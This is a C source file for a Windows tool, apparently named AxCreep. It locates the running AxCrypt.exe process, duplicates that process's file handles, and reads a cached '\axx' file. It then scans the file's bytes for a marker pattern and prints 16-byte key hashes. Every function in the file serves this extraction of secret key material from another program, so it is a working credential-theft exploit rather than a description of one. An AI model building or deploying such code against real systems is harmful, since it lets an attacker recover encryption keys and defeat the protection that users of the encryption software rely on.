# ----------------------------------------------------------------------------
# "THE BEER-WARE LICENSE" (Revision 42):
# <eddy (dot) maaalou (at) gmail (dot) com> wrote this file.  As long as you
# retain this notice you can do whatever you want with this stuff. If we meet
# some day, and you think this stuff is worth it, you can buy me a beer in
# return.   Fist0urs
# ----------------------------------------------------------------------------

#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <stdio.h>
#include "AxCreep.h"

HANDLE hHeap;
typedef DWORD(WINAPI *PNtQuerySystemInformation)(DWORD, VOID*, DWORD, ULONG*);
PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(GetModuleHandle(_T("ntdll.dll")),
    "NtQuerySystemInformation");

typedef NTSTATUS(__stdcall *QUERYOBJECT)(HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG);
QUERYOBJECT NtQueryObject = (QUERYOBJECT)GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtQueryObject");

typedef NTSTATUS(__stdcall *QUERYFILE)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);
QUERYFILE NtQueryInformationFile = (QUERYFILE)GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtQueryInformationFile");

DWORD
FindHashes (
     _In_ BYTE* szDump, 
     _In_ DWORD dwSizeDump
     )
{
    CHAR szHash[33];
    memset(szHash, 0, sizeof(szHash));
    
    for(DWORD i = 0; i <= dwSizeDump - 0x19; i++)
    {
        if(szDump[i]=='\x19' && !memcmp(szDump + i + 1, (BYTE*)("\x00\x00\x00\x00\x00\x00\x00"),7))
        {
            DWORD j=0;
            for(; j<16; j++)
                sprintf_s(szHash + j*2, 3, "%02x", (CHAR*)szDump[i + j + 8]);
            szHash[32]='\0';
            printf("%s\n", szHash);
            i+=0x17;
        }
    }
    return true;
}

DWORD
FindFileCachedHandle (
        _In_ HANDLE hProcSource, 
        _In_ HANDLE hTestedHandle, 
        _In_ TCHAR* szNameHandleDesired
        )
{
    HANDLE hDuplicated;
    POBJECT_TYPE_INFORMATION pStructType = NULL;
    PFILE_NAME_INFORMATION pStructFileName = NULL;
    NTSTATUS dwStatus;
    ULONG ulSizeStructType;
    DWORD IsDumped = FALSE;
    IO_STATUS_BLOCK outFunct;

    if(!DuplicateHandle(
        hProcSource, 
        hTestedHandle, 
        GetCurrentProcess(), 
        &hDuplicated, 
        0, 
        FALSE, 
        DUPLICATE_SAME_ACCESS))
    {
        return FALSE;
    }

    dwStatus = NtQueryObject(hDuplicated, ObjectTypeInformation, NULL, 0, &ulSizeStructType); //type
    pStructType = (POBJECT_TYPE_INFORMATION)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, ulSizeStructType);

    dwStatus = NtQueryObject(hDuplicated, ObjectTypeInformation, pStructType, ulSizeStructType, &ulSizeStructType);
    if(dwStatus != STATUS_SUCCESS)
        return 0;

    if (lstrcmp(pStructType->Name.Buffer, _T("File")) == 0)
    {        
        pStructFileName = (PFILE_NAME_INFORMATION)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PATH);

        dwStatus = NtQueryInformationFile(hDuplicated, &outFunct, pStructFileName, MAX_PATH, FileNameInformation);
        if (dwStatus)
        {
            CloseHandle(hDuplicated);
            HeapFree(hHeap, HEAP_ZERO_MEMORY, pStructType);
            return NULL;
        }

        /* check whether it is the good one or not */
        if (wcsstr(pStructFileName->FileName, szNameHandleDesired) != 0)
        {
            _tprintf(_T("%s\n"), pStructFileName->FileName);
            DWORD dwlSizeToRead;
            DWORD dwhSizeToRead = GetFileSize(hDuplicated, &dwlSizeToRead);

            if(!dwhSizeToRead)
                CloseHandle(hDuplicated);

            BYTE* szDumpedBuffer = (BYTE*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwhSizeToRead); // 1mB
            BYTE szOutBuffer[1025];
            BYTE* szSavedDumpedAddr = szDumpedBuffer;
            DWORD dwBytesRead;

            /* get current position of file pointer */
            DWORD dwFilePointerInitialPos = 0;
            dwFilePointerInitialPos = SetFilePointer(
                            hDuplicated,
                            0,
                            NULL,
                            FILE_CURRENT);

            /* go back to the beginning */
            SetFilePointer(
                      hDuplicated,
                      0,
                      NULL,
                      FILE_BEGIN);

            while(ReadFile(
                hDuplicated,
                szOutBuffer,
                1024,
                &dwBytesRead,
                NULL
                ))
            {
                memcpy(szDumpedBuffer, szOutBuffer, dwBytesRead);
                if(dwBytesRead < 1024)
                    break;
                szDumpedBuffer += dwBytesRead;
            }

            IsDumped = FindHashes(szSavedDumpedAddr, dwhSizeToRead);
            HeapFree(hHeap, 0, szSavedDumpedAddr);
            
            /* restore initial File Pointer */
            SetFilePointer(
                hDuplicated,
                dwFilePointerInitialPos,
                NULL,
                FILE_BEGIN);
        }
    }
    CloseHandle(hDuplicated);
    HeapFree(hHeap, HEAP_ZERO_MEMORY, pStructType);

    return IsDumped;
}

NTSTATUS 
PhEnumHandlesEx (
      _Out_ PSYSTEM_HANDLE_INFORMATION_EX *Handles
      )
{
    static ULONG initialBufferSize = 0x10000;
    NTSTATUS status;
    PVOID buffer;
    ULONG bufferSize;

    bufferSize = initialBufferSize;
    buffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, initialBufferSize);

    while ((status = NtQuerySystemInformation(
        SystemExtendedHandleInformation,
        buffer,
        bufferSize,
        NULL
        )) == STATUS_INFO_LENGTH_MISMATCH)
    {
        HeapFree(hHeap, 0, buffer);
        bufferSize *= 2;

        if (bufferSize > PH_LARGE_BUFFER_SIZE)
            return false; //to avoid warning STATUS_INSUFFICIENT_RESOURCES;

        buffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, bufferSize);
    }

    if (!NT_SUCCESS(status))
    {
        HeapFree(hHeap, 0, buffer);
        return status;
    }

    if (bufferSize <= 0x200000) initialBufferSize = bufferSize;
    *Handles = (PSYSTEM_HANDLE_INFORMATION_EX)buffer;

    return status;
}

DWORD
PhEnumHandlesGeneric (
    _In_ HANDLE hTargetProcess,
    _Out_ PSYSTEM_HANDLE_INFORMATION_EX *Handles,
    _Out_ PBOOLEAN FilterNeeded
    )
{
    PSYSTEM_HANDLE_INFORMATION_EX handles;
    NTSTATUS status;

    if (!NT_SUCCESS(status = PhEnumHandlesEx(&handles)))
        return FALSE;

    *Handles = handles;
    *FilterNeeded = TRUE;

    return TRUE;
}

DWORD 
GetProcessList (VOID)
{
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        printError(_T("CreateToolhelp32Snapshot (of processes)"));
        return(FALSE);
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32))
    {
        printError(_T("Process32First"));
        CloseHandle(hProcessSnap);
        return FALSE;
    }
    
    do
    {
        if (!wcscmp(pe32.szExeFile, _T("AxCrypt.exe")))
        {
            CloseHandle(hProcessSnap);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return 0;
}

VOID
printError (_In_ TCHAR* msg)
{
    DWORD eNum;
    TCHAR sysMsg[256];
    TCHAR* p;

    eNum = GetLastError();
    FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, eNum,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        sysMsg, 256, NULL);

    p = sysMsg;
    while ((*p > 31) || (*p == 9))
        ++p;
    do { *p-- = 0; } while ((p >= sysMsg) &&
        ((*p == '.') || (*p < 33)));

    _tprintf(_T("\n  WARNING: %s failed with error %d (%s)"), msg, eNum, sysMsg);
}

int 
main(VOID)
{
    hHeap = HeapCreate(0, 10, 0);

    HANDLE hProcessAxCrypt;
    DWORD dwAxCryptPID = GetProcessList();

    PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handles;
    ULONG numberOfHandles;

    PSYSTEM_HANDLE_INFORMATION_EX handleInfo = NULL;
    BOOLEAN filterNeeded;

    if (dwAxCryptPID == NULL)
    {
        printError(_T("Cannot find AxCrypt\n"));
        exit(0);
    }
    hProcessAxCrypt = OpenProcess(PROCESS_DUP_HANDLE, FALSE, dwAxCryptPID);
    if (hProcessAxCrypt == NULL)
    {
        printError(_T("Error: OpenProcess\n"));
        exit(0);
    }
    else
    {
        HANDLE hCurrentProcess = GetCurrentProcess();
        HANDLE hDuplicatedFileHandle = NULL;
        HANDLE hTargetFileHandle = NULL;

        PhEnumHandlesGeneric(
            hProcessAxCrypt,
            &handleInfo,
            &filterNeeded
            );

        handles = handleInfo->Handles;
        
        numberOfHandles = (ULONG)handleInfo->NumberOfHandles;
        for (DWORD i = 0; i < numberOfHandles; i++)
        {
            if (handles->UniqueProcessId == dwAxCryptPID)
                if (FindFileCachedHandle(hProcessAxCrypt, (HANDLE)handles->HandleValue, _T("\\axx")) == 1)
                    break;

                handles++;
        }
        CloseHandle(hProcessAxCrypt);
    }

    HeapDestroy(hHeap);
    return 0;
}